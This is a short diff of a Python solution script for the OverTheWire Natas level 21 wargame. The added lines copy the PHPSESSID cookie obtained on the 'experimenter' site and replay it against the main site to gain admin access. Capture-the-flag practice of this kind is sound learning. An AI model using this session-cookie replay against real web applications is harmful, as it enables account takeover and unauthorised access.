@@ -71,3 +71,12 @@ print(f'{div_content}\n')
 # if we get an admin access on the second website and we pass the cookie,
 # PHPSESSID, to the first website,
 # we can get the admin access as well on the first website
+print(f'{session.cookies}\n')
+# get the cookie from the second website
+target_cookie = session.cookies.get_dict(domain='natas21-experimenter.natas.labs.overthewire.org')
+# clear the session.cookies to remove the cookies from the first website
+session.cookies.clear()
+# get the first website using the cookies that we get from the second website
+response = session.get(URL, cookies=target_cookie)
+div_content = bs4.BeautifulSoup(response.text, "html.parser").body.find('div', {'id' : 'content'})
+print(f'{div_content}\n')
